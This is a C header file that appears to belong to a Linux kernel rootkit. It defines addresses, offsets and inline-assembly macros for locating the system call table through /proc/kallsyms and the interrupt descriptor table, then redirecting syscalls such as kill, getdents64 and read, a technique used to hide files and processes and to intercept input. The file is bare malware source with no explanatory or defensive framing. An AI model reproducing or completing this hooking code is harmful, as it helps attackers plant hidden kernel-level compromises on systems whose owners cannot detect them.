#ifndef HOOK_H
#define HOOK_H


#define PROC_HOME	"/proc/kallsyms"
#define SYSENTER_ENTRY	"sysenter_entry"
#define BUFF 		100

#define READ_NUM	256

#define ORIG_EXIT	19
#define DIRECALL 	42
#define SALTO 		5
#define SKILL 		49
#define SGETDENTS64 	57
#define SREAD 		65
#define DAFTER_CALL 	70
#define DNRSYSCALLS 	10

#define ASMIDType( valor ) \
    __asm__ ( valor );

#define JmPushRet( valor )     \
    ASMIDType          \
    (              \
        "push %0   \n"     \
        "ret       \n"     \
                   \
        : : "m" (valor)    \
    );

#define CallHookedSyscall( valor ) \
    ASMIDType( "call *%0" : : "r" (valor) );


struct descriptor_idt
{
        unsigned short offset_low;
        unsigned short ignore1;
        unsigned short ignore2;
        unsigned short offset_high;
};

static struct {
        unsigned short limit;
        unsigned long base;
}__attribute__ ((packed)) idt48;

atomic_t read_activo;
spinlock_t wnps_lock = SPIN_LOCK_UNLOCKED;

unsigned int system_call_addr;
void *sys_call_table_addr;
void **sys_call_table;
void *sysenter_entry;

unsigned long dire_call,dire_exit,after_call;

int errno;

#endif

